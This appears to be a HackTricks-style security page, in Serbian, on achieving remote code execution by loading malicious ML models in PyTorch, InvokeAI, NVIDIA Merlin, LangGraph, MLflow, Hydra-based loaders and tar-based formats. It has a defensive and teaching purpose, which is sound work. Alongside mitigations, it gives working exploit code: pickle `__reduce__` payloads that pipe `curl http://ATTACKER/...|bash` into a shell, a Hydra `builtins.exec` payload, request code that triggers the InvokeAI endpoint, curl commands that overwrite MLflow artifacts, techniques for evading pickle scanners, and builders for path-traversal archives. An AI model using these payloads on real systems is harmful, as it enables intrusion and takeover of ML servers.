# RCE modela

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela radi RCE

Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch itd. Ti modeli se mogu učitavati na računare programera ili u produkcione sisteme radi korišćenja. Modeli obično ne bi trebalo da sadrže zlonameran kod, ali postoje slučajevi u kojima se model može iskoristiti za izvršavanje proizvoljnog koda na sistemu kao predviđena funkcionalnost ili zbog ranjivosti u biblioteci za učitavanje modela.

Sledeća tabela navodi reprezentativne ranjivosti iz ove kategorije:

| **Okvir / alat**        | **Ranjivost (CVE ako je dostupan)**                                                    | **RCE vektor**                                                                                                                           | **Reference**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Nesigurna deserijalizacija u* `torch.load` **(CVE-2025-32434)**                                                              | Zlonameran pickle u kontrolnoj tački modela dovodi do izvršavanja koda (zaobilazeći zaštitu `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + preuzimanje zlonamernog modela dovodi do izvršavanja koda; RCE putem Java deserijalizacije u API-ju za upravljanje                                        | |
| **NVIDIA Merlin Transformers4Rec** | Nesigurna deserijalizacija kontrolne tačke putem `torch.load` **(CVE-2025-23298)**                                           | Nepouzdana kontrolna tačka pokreće pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršavanje koda u ML radniku            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + nesigurna MessagePack ekstenzija hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ključ `filter` kojim upravlja korisnik ubacuje SQL/JSON-path sintaksu, `UNION SELECT` kreira lažni red kontrolne tačke, a zatim `msgpack` deserijalizacija uvozi i poziva Python kod koji je izabrao napadač | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML-a koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa slojem **Lambda** izvršava proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                          | Pripremljen `.tflite` model izaziva prekoračenje celog broja → oštećenje hipa (potencijalni RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim sadržajem `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *osporeno*                                                                              | Podrazumevano je `numpy.load` dozvoljavao nizove objekata sa pickle-om – zlonameran `.npy/.npz` izaziva izvršavanje koda                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Putanja do spoljašnjih težina ONNX modela može da izađe iz direktorijuma (čitanje proizvoljnih datoteka) <br> Zlonamerna ONNX model tar arhiva može da prepiše proizvoljne datoteke (što dovodi do RCE) | |
| ONNX Runtime (rizik dizajna)  | *(Nema CVE)* ONNX custom ops / control flow                                                                                    | Model sa custom operatorom zahteva učitavanje napadačevog native koda; složeni grafovi modela zloupotrebljavaju logiku da bi izvršili nenamerne proračune   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje API-ja za učitavanje modela sa uključenim `--model-control` omogućava path traversal relativnom putanjom radi upisivanja datoteka (npr. prepisivanje `.bashrc` za RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više prekoračenja hipa)                                                                         | Neispravna GGUF datoteka modela izaziva prekoračenja bafera hipa u parseru, čime se omogućava izvršavanje proizvoljnog koda na sistemu žrtve                     | |
| **Keras (stariji formati)**   | *(Nema novog CVE-a)* Nasleđeni Keras H5 model                                                                                         | Zlonameran HDF5 (`.h5`) model sa slojem Lambda i dalje izvršava kod pri učitavanju (Keras safe_mode ne pokriva stari format – „downgrade attack“) | |
| **Ostalo** (opšte)        | *Greška u dizajnu* – serijalizacija pomoću Pickle                                                                                         | Mnogi ML alati (npr. formati modela zasnovani na pickle-u, Python `pickle.load`) izvršavaju proizvoljan kod ugrađen u datoteke modela ako nisu preduzete mere zaštite | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nepouzdani metapodaci prosleđeni funkciji `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metapodaci/konfiguracija modela pod kontrolom napadača postavljaju `_target_` na proizvoljan poziv (npr. `builtins.exec`) → izvršava se tokom učitavanja, čak i uz „bezbedne“ formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Pored toga, postoje neki modeli zasnovani na Python pickle-u, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu iskoristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitavaju sa `weights_only=True`. Zato svaki model zasnovan na pickle-u može biti posebno podložan ovoj vrsti napada, čak i ako nije naveden u gornjoj tabeli.

### Zaobilaženje statičkih provera na kontrolnim tačkama zasnovanim na pickle-u

Putanja za učitavanje modela koja poziva neograničeni `pickle.load()`, `joblib.load()` ili `torch.load(..., weights_only=False)` predstavlja tačku izvršavanja, a ne samo parser.<sup>[[22]](#references)</sup> U PyTorch 2.6, `torch.load()` podrazumevano koristi `weights_only=True` kada nije prosleđen prilagođeni pickle modul; primeri u nastavku zahtevaju neograničeni učitavač ili aplikaciju koja isključuje ovu zaštitu kako bi učitala nepodržani objekat.<sup>[[4]](#references)</sup> Čist rezultat statičkog skeniranja ne menja tu granicu.<sup>[[21]](#references)</sup>

Pogledajte [Python pickle deserijalizaciju](../pentesting-web/deserialization/#pickle) za osnovni `__reduce__` primitiv i [Ficklingovu allowlistu za ML import](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) za provere importa tokom izvršavanja.

#### Registrujte poziv, pa ga razrešite pomoću `EXT2`

Pickle može da pozove `copyreg.add_extension` putem `REDUCE` i registruje par module/name pod numeričkim extension kodom koji je izabrao napadač. Kasniji `EXT2` razrešava taj kod u poziv, koji drugi `REDUCE` može da pozove. Dakle, ključni poziv nije operand opkoda `GLOBAL` ili `STACK_GLOBAL`. Binarly je ovo demonstrirao pomoću `multiprocessing.util.spawnv_passfds`; četiri od pet testiranih skenera nisu ga otkrila, dok ga je SaferPickle otkrio. Izmena registra i razrešavanje pomoću `EXT2` dešavaju se tokom iste operacije deserijalizacije pickle-a.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Ovo je skica opcode-ova, a ne kompletan checkpoint: spoljašnji loader mora da prihvati okolni pickle stream. Scanner koji samo traži opasne callables u operandima `GLOBAL` propušta kasniji lookup; scanner bez podrške za `EXT2` može da zakaže pre nego što donese presudu. Strogi allowlist i dalje može da odbaci sam `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Sakrijte konstruisane tipove code-object-a iza običnih funkcija

Drugi pickle chain može da dobavi `FunctionType` pomoću `type(copy.copy)` i `CodeType` pomoću `type(copy.copy.__code__)`, a zatim da konstruiše code object iz dostavljenog bytecode-a, umota ga kao funkciju i pozove. Objavljena varijanta dobavlja `__code__` preko `operator.methodcaller('__getattribute__', '__code__')`, tako da pickle ne mora da uvozi nijedan od konstruktora po imenu. Raspored polja za `CodeType(...)` i bytecode zavise od verzije CPython-a; payload napravljen za drugi interpreter može da zakaže pre izvršavanja. SaferPickle je i dalje označio demonstrirani primer, ali ga je svrstao u kategoriju `suspicious`; ostala četiri testirana scanner-a su ga propustila.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Pokrenite učitavanje drugog modela iz argumenta pickle-a

Spoljašnji pickle može da pozove `torch.storage._load_from_bytes` i prosledi mu model koji je napadač serijalizovao kao argument. Ta funkcija poziva `torch.load(io.BytesIO(b), weights_only=False)`, pa se ugnježđeni model deserijalizuje bez ograničenja `weights_only`, iako se pri skeniranju opcode-ova na najvišem nivou vidi samo niz bajtova prosleđen jednoj funkciji. Spoljašnje učitavanje i dalje mora da dozvoli tu funkciju; `weights_only=True` ne znači automatski da će spoljašnji pickle prihvatiti taj poziv. Skeneri koji ne rekurzivno pregledaju ugnježđene bajtove mogu da previde unutrašnji niz `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Razrešite zastarelo ime pickle modula tokom učitavanja

Za pickle protokole starije od 3, Python-ov podrazumevani `fix_imports=True` preslikava `GLOBAL` referencu na `commands.run` u `subprocess.run` preko `_compat_pickle.IMPORT_MAPPING`. Skener koji poredi doslovni naziv modula sa denylist-om za `subprocess` zato može da previdi funkciju koja će se zaista pozvati u toku izvršavanja. Za ovo je potreban loader koji zadržava mapiranje kompatibilnosti i prihvata prosleđene argumente funkcije.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Usmerite checkpoint koji nije ZIP mimo skenera namenjenog samo za ZIP

Izbor formata može da zakaže nezavisno od pregleda opcode-ova: Binarly je utvrdio da je ModelScan 0.8.8 usmeravao datoteke `.bin`, `.pt`, `.pth` i `.ckpt` ka PyTorch skeneru namenjenom ZIP formatu, pa je preskakao pickle tok koji nije ZIP umesto da ga prosledi svom skeneru za običan pickle. Dokumentovan je i zastareli TAR raspored modela koji `torch.load()` prihvata, ali ga ModelScan i JFrog nisu pregledali. Ovo su propusti specifični za verzije skenera, a ne osobine svih skenera modela.<sup>[[21]](#references)</sup>

#### Izvršite kod pre nego što statički parser naiđe na neispravan završetak

Skener koji u potpunosti prolazi kroz pickle pomoću `pickletools.genops()` može da izazove grešku na skraćenom opcode-u posle ispravnog `REDUCE`. Unrestricted unpickler je već pozvao funkciju pre nego što naiđe na taj završetak, čak i ako se kasnije učitavanje završi greškom. U prijavljenom primeru, skraćeni `BINUNICODE` postavljen je odmah posle izvršnog `REDUCE`, pa je `pickletools.genops()` izazvao grešku nakon što je prethodno došlo do sporednog efekta upisa datoteke. Ovo zaobilazi skener samo ako on tretira grešku pri parsiranju kao bezazlenu ili preskoči datoteku. Korisno je samo ako je sporedni efekat važan i bez uspešno vraćenog modela; cilj koji zahteva da se učitavanje dovrši može da odbaci artefakt.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (radi čak i sa safetensors)

`hydra.utils.instantiate()` uvozi i poziva bilo koji `_target_` sa tačkama u konfiguraciji ili objektu metadata. Kada biblioteke kao što je Hugging Face Transformers proslede **nepouzdanu metadata modela** funkciji `instantiate()`, napadač može da zada funkciju i argumente koji se odmah izvršavaju tokom učitavanja modela (pickle nije potreban).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Primer payload-a (radi u `.nemo` `model_config.yaml`, repozitorijumskom `config.json` ili u `__metadata__` unutar `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ključne tačke:
- Pokreće se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders i FlexTok loaders.
- Hydra-ina string block-list može da se zaobiđe alternativnim putanjama za import (npr. `enum.bltns.eval`) ili imenima koja razrešava aplikacija (npr. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok takođe parsira metapodatke u obliku stringa pomoću `ast.literal_eval`, što omogućava DoS (prekomernu potrošnju CPU-a i memorije) pre poziva Hydra.

### 🆕  InvokeAI RCE preko `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install`, koji korisnicima omogućava da preuzmu i učitaju modele sa proizvoljnih URL-ova.<sup>[[1]](#references)</sup>

Interno, endpoint na kraju poziva:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Kada je prosleđena datoteka **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvršava **pickle deserializaciju**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može da ugradi zlonamerni objekat sa prilagođenom metodom `__reduce__` u checkpoint; ta metoda se izvršava **tokom deserializacije**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranjivosti je dodeljen **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Vodič kroz eksploataciju

1. Napravite zlonamerni checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hostuj `payload.ckpt` na HTTP serveru koji kontrolišeš (npr. `http://ATTACKER/payload.ckpt`).
3. Aktiviraj ranjivu krajnju tačku (autentifikacija nije potrebna):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → gadget `os.system` se pokreće i napadač dobija mogućnost izvršavanja koda u kontekstu procesa InvokeAI.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.<sup>[[3]](#references)</sup>

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana vrednost zastavice scan je **false**)
•  `/api/v2/models/install` je dostupan napadaču
•  Proces ima dozvole za izvršavanje shell komandi

#### Mere ublažavanja

* Nadogradite na **InvokeAI ≥ 5.4.3** – zakrpa podrazumevano postavlja `scan=True` i skenira datoteku u potrazi za malware-om pre deserijalizacije.<sup>[[2]](#references)</sup>
* Pri programskom učitavanju checkpoint-ova koristite `torch.load(file, weights_only=True)` ili novi pomoćni alat [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Sprovodite allow-lists / potpise za izvore modela i pokrećite servis uz minimalne privilegije.

> ⚠️ Imajte na umu da je svaki format zasnovan na Python pickle-u (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` datoteke) po prirodi nebezbedan za deserijalizaciju iz nepouzdanih izvora.

---

Primer ad hoc mere ublažavanja ako morate da nastavite da koristite starije verzije InvokeAI iza reverse proxy-ja:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE putem nebezbednog `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (deo Merlin-a) izložio je nebezbedan učitavač checkpoint-a koji je direktno pozivao `torch.load()` nad putanjama koje je dostavio korisnik. Pošto se `torch.load` oslanja na Python `pickle`, checkpoint pod kontrolom napadača može da izvrši proizvoljan kod putem reducer-a tokom deserijalizacije.<sup>[[5]](#references)</sup>

Ranjiva putanja (pre ispravke): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE-a: U Python `pickle`-u, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća pozivljivu funkciju i argumente. Pozivljiva funkcija se izvršava tokom unpickling-a. Ako se takav objekat nalazi u checkpoint-u, izvršava se pre upotrebe bilo kojih težina.

Minimalni primer zlonamernog checkpoint-a:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vektori isporuke i opseg uticaja:
- Trojanizovani checkpoints/models koji se dele preko repos, buckets ili artifact registries
- Automatizovani resume/deploy pipelines koji automatski učitavaju checkpoints
- Izvršavanje se odvija unutar training/inference workers, često sa povišenim privilegijama (npr. root u containers)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni `torch.load()` ograničenim deserializer-om sa allow-listom, implementiranim u `transformers4rec/utils/serialization.py`. Novi loader proverava tipove/polja i sprečava pozivanje proizvoljnih callables tokom učitavanja.<sup>[[7]](#references)</sup>

Smernice za odbranu specifične za PyTorch checkpoints:
- Ne radite unpickle nepouzdanih podataka. Kad god je moguće, koristite neizvršne formate kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX.
- Ako morate da koristite PyTorch serialization, obavezno postavite `weights_only=True` (podržano u novijim verzijama PyTorch-a) ili koristite prilagođeni unpickler sa allow-listom, sličan zakrpi za Transformers4Rec.<sup>[[4]](#references)</sup>
- Proveravajte poreklo/potpise modela i sandbox-ujte deserialization (seccomp/AppArmor; non-root user; ograničeni FS i bez izlaznog mrežnog saobraćaja).
- Pratite pojavu neočekivanih child processes u ML servisima prilikom učitavanja checkpoint-a; pratite upotrebu `torch.load()`/`pickle`.

POC i reference na ranjivost/zakrpu:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ranjivi loader pre zakrpe: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC zlonamernog checkpoint-a: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader posle zakrpe: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Primer – kreiranje zlonamernog PyTorch modela

- Kreirajte model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Učitaj model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD izlaže `resnet` endpoint koji deserijalizuje podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može da navede žrtvu da učita zlonamernu stranicu/datoteku, da ona pošalje posebno oblikovan serijalizovani blob na taj endpoint i pokrene deserijalizaciju kao `root`, što dovodi do potpunog kompromitovanja sistema.

Tok exploita prati tipičnu zloupotrebu pickle formata:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Svaki gadget kojem se može pristupiti tokom deserializacije (konstruktori, `__setstate__`, povratni pozivi frameworka itd.) može se na isti način zloupotrebiti, bez obzira na to da li je prenos obavljen putem HTTP-a, WebSocket-a ili datoteke odložene u direktorijum koji se nadgleda.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da otpremi zlonamernu datoteku modela**. Umesto toga, aplikacija izlaže **API za trajno čuvanje stanja AI agenta** (`get_state_history(..., filter=...)`), a korisnički unos dospeva do graditelja upita checkpointer-a.

#### 1. Strukturni SQLi u filterima metapodataka

Ranjivi SQLite obrazac izgledao je ovako:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Vrednost se prosleđuje kasnije, ali se `query_key` konkatenira u **JSON path string**, pa `'` unutar ključa rečnika izlazi iz `'$.{query_key}'` i ubacuje SQL. Ista pouka važi za **JSON paths, identifiers, operators, `LIMIT` i TTL fields**: placeholders štite samo vrednosti, ne i strukturnu sintaksu upita.

#### 2. `UNION SELECT` može da cilja nizvodne sinks, ne samo krađu podataka

Upit vraća `type` i serijalizovane `checkpoint` bajtove, koje kasnije koriste kao:

```python
self.serde.loads_typed((type, checkpoint))
```

To znači da SQLi u klauzuli `WHERE` može da ubaci **lažni red rezultata**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ako kasniji kod parsira, deserijalizuje, upisuje ili izvršava neku od izabranih kolona, mapirajte te kolone na njihove sink-ove. U ovom slučaju, lažni red pretvara SQLi u **deserijalizaciju pod kontrolom napadača**.

#### 3. Nebezbedni MessagePack extension hook-ovi ekvivalentni su code gadget-ima

LangGraph-ova `msgpack` putanja koristila je prilagođeni extension hook koji je raspakovao ugnježdenu torku i izvršio:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dakle, MessagePack extension objekat koji kodira nešto ekvivalentno `("os", "system", "id > /tmp/pwned")` uvozi `os`, pronalazi `system` i izvršava komandu. Pri pregledu AI frameworka, proverite **prilagođene MessagePack/JSON/pickle revivers** zbog dinamičkih uvoza, refleksije ili proizvoljnog pozivanja callable objekata.

#### 4. Praktični obrazac za audit agent frameworka

Pregledajte svaki korisnički kontrolisani ulaz koji stiže do:
- API-ja za istoriju stanja / memoriju / replay / listanje checkpointa
- strukturiranih filter buildera koji generišu SQL ili delove Redis upita
- prilagođenih deserializatora (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- putanja za oporavak koje veruju redovima vraćenim iz persistence sloja

Ovaj konkretan lanac uticao je na self-hosted LangGraph deployment-e koji koriste **SQLite** ili **Redis** checkpointer-e kada su nepouzdani korisnici mogli da kontrolišu `filter`. Zakrpljene verzije navedene u objavi bile su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` i `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc prepisivanje artifacta do pickle RCE-a

MLflow PyFunc kreiran od `PythonModel` može da sačuva serijalizovani objekat kao `python_model.pkl`. Metapodaci modela navode `mlflow.pyfunc.model` kao njegov loader, a MLflow implementacija koristi ovo ime datoteke za sačuvani Python model. Zbog toga pristup za upis u artifact store može dovesti do izvršavanja koda u drugoj aplikaciji koja kasnije učita model.<sup>[[17]](#references)[[18]](#references)</sup>

Korisni lanac je **dozvola za upis artifacta → zamena pickle datoteke → navođenje inference potrošača da je ponovo učita**. Za eksperiment koji koristi proxied `mlflow-artifacts:/...` root, izlistajte putanje do experimenta, run-a i model artifacta. Tracking server izlaže `GET` i `PUT` na `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimalni reducer može da izvrši komandu čim korisnik izvrši unpickle artefakt. Generisanje payload-a pomoću Python verzije navedene u `MLmodel` izbegava probleme sa kompatibilnošću.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Pokrenite operaciju koja **učitava postojeći model**, kao što su predviđanje, ocenjivanje ili postavljanje. Nemojte prvo ponovo trenirati model, jer trening može zameniti zlonamerni artefakt novim modelom. Greška aplikacije ne znači da eksploatacija nije uspela: reducer vraća celobrojni izlazni status komande umesto upotrebljivog modela. Počnite od uočljivog sporednog efekta, kao što su ICMP ili HTTP callback, a zatim ga zamenite konačnim payload-om.<sup>[[20]](#references)</sup>

Tokom procene razlikujte dozvolu za kreiranje run-a od dozvole za prepisivanje artefakata koji pripadaju drugom run-u. Pregledajte autentifikaciju i dozvole za ažuriranje po run-u, proverite neočekivane izmene fajla `python_model.pkl` i tretirajte poreklo i integritet modela kao deo granice izvršavanja. Aktuelni MLflow kod takođe podržava podešavanje `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` i preporučuje artifacts models-from-code umesto učitavanja cloudpickle podataka.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Izloženi serveri modela i ML infrastruktura

Učitavanje zlonamernog modela nije jedini način za izvršavanje koda na ML infrastrukturi. API-ji za slanje poslova, endpoint-i za validaciju koda i preuzimanje iz registra modela za AI servise koji se sami hostuju mogu dovesti do izvršavanja koda bez ikakvog fajla modela. Pogledajte [Izloženi AI servisi koji se sami hostuju](AI-Exposed-Self-Hosted-AI-Services.md).

## Modeli do Path Traversal

Kao što je navedeno u [**ovoj objavi na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI framework-ovi zasniva se na arhivama, obično `.zip`. Zato bi moglo biti moguće zloupotrebiti ove formate za napade Path Traversal, koji omogućavaju čitanje proizvoljnih fajlova sa sistema na kojem se model učitava.<sup>[[16]](#references)</sup>

Na primer, sledećim kodom možete napraviti model koji će prilikom učitavanja kreirati fajl u direktorijumu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ili, pomoću sledećeg koda možete kreirati model koji će napraviti symlink ka direktorijumu `/tmp` kada se učita:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Detaljna analiza: Keras .keras deserializacija i lov na gadgete

Za fokusirani vodič kroz interne mehanizme .keras, RCE preko Lambda-layer-a, problem proizvoljnog uvoza u verzijama ≤ 3.8 i otkrivanje gadgeta unutar allowlist-e nakon ispravke, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – Deserializacija nepouzdanih podataka u InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI commit za ispravku 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacija Rapid7 Metasploit modula](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Dobijanje daljinskog izvršavanja koda u NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI bezbednosno obaveštenje: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec commit za ispravku b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ranjivi loader pre ispravke (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC zlonamernog checkpoint-a (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nakon ispravke (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Daljinsko izvršavanje koda uz moderne AI/ML formate i biblioteke](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra dokumentacija za instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra commit za block-list (upozorenje o RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi do RCE: Iskorišćavanje LangGraph checkpointer-a](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Preusmeravanje grešaka Archive Slip ka vrednim AI/ML bounty nagradama](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
